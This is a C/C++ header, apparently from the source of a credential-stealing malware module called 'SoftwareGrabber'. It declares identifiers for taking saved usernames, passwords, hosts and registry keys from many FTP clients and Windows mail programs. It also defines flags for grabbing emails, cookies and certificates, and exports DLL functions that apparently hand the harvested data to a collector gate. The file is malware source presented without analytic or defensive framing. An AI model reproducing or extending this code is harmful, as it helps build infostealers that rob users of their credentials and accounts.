
enum
{
	softwaregrabber_flashplayer_path,
	softwaregrabber_flashplayer_archive,
	softwaregrabber_flashplayer_mask,
	softwaregrabber_wab_title,
	softwaregrabber_wab_regkey,
	softwaregrabber_wab_wabopen,
	softwaregrabber_wc_title,
	softwaregrabber_wc_init_name,
	softwaregrabber_wc_init_version,
	softwaregrabber_wc_property_format,
	softwaregrabber_windows_mail_recips_title,
	softwaregrabber_outlook_express_recips_title,
	softwaregrabber_outlook_express_title,
	softwaregrabber_windows_mail_file_1,
	softwaregrabber_windows_mail_regkey,
	softwaregrabber_windows_live_mail_regkey,
	softwaregrabber_windows_mail_regvalue_path,
	softwaregrabber_windows_mail_regvalue_salt,
	softwaregrabber_windows_mail_to_port,
	softwaregrabber_windows_mail_title,
	softwaregrabber_windows_live_mail_title,
	softwaregrabber_windows_mail_xml_root,
	softwaregrabber_windows_mail_xml_name,
	softwaregrabber_windows_mail_xml_email,
	softwaregrabber_account_title,
	softwaregrabber_account_server_info,
	softwaregrabber_account_server_x_server,
	softwaregrabber_account_server_x_username,
	softwaregrabber_account_server_x_password,
	softwaregrabber_account_server_x_port,
	softwaregrabber_account_server_x_ssl,
	softwaregrabber_account_server_smtp,
	softwaregrabber_account_server_pop3,
	softwaregrabber_account_server_imap,
	softwaregrabber_account_server_ssl,

	softwaregrabber_ftp_report_format1W,
	softwaregrabber_ftp_report_format2W,
	softwaregrabber_ftp_report_format1A,
	softwaregrabber_flashfxp_secret,
	softwaregrabber_flashfxp_file_1,
	softwaregrabber_flashfxp_file_2,
	softwaregrabber_flashfxp_file_3,
	softwaregrabber_flashfxp_host,
	softwaregrabber_flashfxp_port,
	softwaregrabber_flashfxp_user,
	softwaregrabber_flashfxp_pass,
	softwaregrabber_flashfxp_regkey,
	softwaregrabber_flashfxp_regvalue,
	softwaregrabber_flashfxp_path_mask,
	softwaregrabber_flashfxp_title,
	softwaregrabber_tc_file_1,
	softwaregrabber_tc_section_bad_1,
	softwaregrabber_tc_section_bad_2,
	softwaregrabber_tc_host,
	softwaregrabber_tc_user,
	softwaregrabber_tc_pass,
	softwaregrabber_tc_regkey,
	softwaregrabber_tc_regvalue_ftp,
	softwaregrabber_tc_regvalue_dir,
	softwaregrabber_tc_path_mask_1,
	softwaregrabber_tc_path_mask_2,
	softwaregrabber_tc_path_mask_3,
	softwaregrabber_tc_title,
	softwaregrabber_wsftp_file_1,
	softwaregrabber_wsftp_section_bad_1,
	softwaregrabber_wsftp_host,
	softwaregrabber_wsftp_port,
	softwaregrabber_wsftp_user,
	softwaregrabber_wsftp_pass,
	softwaregrabber_wsftp_regkey,
	softwaregrabber_wsftp_regvalue,
	softwaregrabber_wsftp_path_mask_1,
	softwaregrabber_wsftp_title,
	softwaregrabber_filezilla_file_mask_1,
	softwaregrabber_filezilla_node_mask,
	softwaregrabber_filezilla_host,
	softwaregrabber_filezilla_port,
	softwaregrabber_filezilla_user,
	softwaregrabber_filezilla_pass,
	softwaregrabber_filezilla_path_mask_1,
	softwaregrabber_filezilla_title,
	softwaregrabber_far_regkey_1,
	softwaregrabber_far_regkey_2,
	softwaregrabber_far_host,
	softwaregrabber_far_user_1,
	softwaregrabber_far_user_2,
	softwaregrabber_far_pass,
	softwaregrabber_far_title,
	softwaregrabber_winscp_regkey,
	softwaregrabber_winscp_host,
	softwaregrabber_winscp_port,
	softwaregrabber_winscp_user,
	softwaregrabber_winscp_pass,
	softwaregrabber_winscp_title,
	softwaregrabber_fc_file_1,
	softwaregrabber_fc_host,
	softwaregrabber_fc_port,
	softwaregrabber_fc_user,
	softwaregrabber_fc_pass,
	softwaregrabber_fc_path_mask_1,
	softwaregrabber_fc_title,
	softwaregrabber_coreftp_regkey,
	softwaregrabber_coreftp_host,
	softwaregrabber_coreftp_port,
	softwaregrabber_coreftp_user,
	softwaregrabber_coreftp_pass,
	softwaregrabber_coreftp_title,
	softwaregrabber_smartftp_file_mask_1,
	softwaregrabber_smartftp_node,
	softwaregrabber_smartftp_host,
	softwaregrabber_smartftp_port,
	softwaregrabber_smartftp_user,
	softwaregrabber_smartftp_pass,
	softwaregrabber_smartftp_regkey_1,
	softwaregrabber_smartftp_regvalue_1,
	softwaregrabber_smartftp_regkey_2,
	softwaregrabber_smartftp_regvalue_2,
	softwaregrabber_smartftp_title,
	softwaregrabber_cuteftp_title,
};

enum
{
	GRAB_EMAILS = 0x1,
	GRAB_FTPS = 0x2,
	GRAB_COOKIES = 0x4,
	GRAB_CERTS = 0x8,
	GRAB_SOL = 0x10,
	GRAB_ALL = GRAB_EMAILS | GRAB_FTPS | GRAB_COOKIES | GRAB_CERTS | GRAB_SOL,
};

#define DllExport __declspec(dllexport)

#if BO_DEBUG > 0
#define WDEBUG(fmt, ...) g_Debug(__FUNCTION__, __FILE__, __LINE__, 0, L##fmt, __VA_ARGS__);
#else
#define WDEBUG(fmt, ...)
#endif

namespace SoftwareGrabber
{
	extern "C"
	{
		DllExport void __cdecl TakeGateToCollector3(void *lpGateFunc2);
		DllExport void __cdecl TakeWriteData(void *lpGateFunc4);
		DllExport BOOL __cdecl Init(char *szConfig);
		DllExport BOOL __cdecl Start();
		DllExport BOOL __cdecl Stop();
#if BO_DEBUG > 0
		DllExport VOID __cdecl TakeDebugGate(void* lpDebugGate);
#endif
	}
}